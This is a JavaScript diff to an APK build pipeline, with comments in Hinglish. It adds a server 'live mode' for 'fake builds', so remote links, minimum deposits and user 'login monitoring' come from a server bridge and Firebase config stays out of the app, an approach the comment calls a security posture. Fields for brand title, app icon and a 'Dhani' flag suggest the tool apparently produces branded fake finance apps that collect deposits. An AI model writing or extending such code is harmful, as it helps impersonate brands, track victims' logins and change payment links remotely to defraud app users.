@@ -402,6 +402,22 @@ async function buildApkInWorker(order, design, buildId, logCallback) {
       minDeposit: order.min_deposit, brandTitle: order.brand_title,
       appIconBase64, isDhani
     };
+    // ── FAKE BUILD = SERVER LIVE MODE ──
+    // Fake APK me Firebase SDK/config embed nahi hota (security posture).
+    // Runtime links / minDeposit / conditions / users (login monitoring,
+    // warning popup) server ke /api/rtdb bridge se aate hai — rtdb shim
+    // injectParams template me inject karta hai. BASE_URL env set hona
+    // zaroori hai; na ho to purana Firebase-mode fallback (no regression).
+    if (isFakeBuild) {
+      const liveBase = String(process.env.BASE_URL || '').replace(/\/+$/, '');
+      if (/^https?:\/\//i.test(liveBase)) {
+        params.liveMode = 'server';
+        params.liveBase = liveBase;
+        log('Fake build: server live mode ON (' + liveBase + ')');
+      } else {
+        log('WARNING: BASE_URL env set nahi hai — fake build me live links fallback (Firebase mode) use hoga');
+      }
+    }
 
     log('Injecting parameters into HTML...');
     const processedPopup   = normalizeRegisterDelay(ensureAudioGate(injectParams(popupHtml, params)));
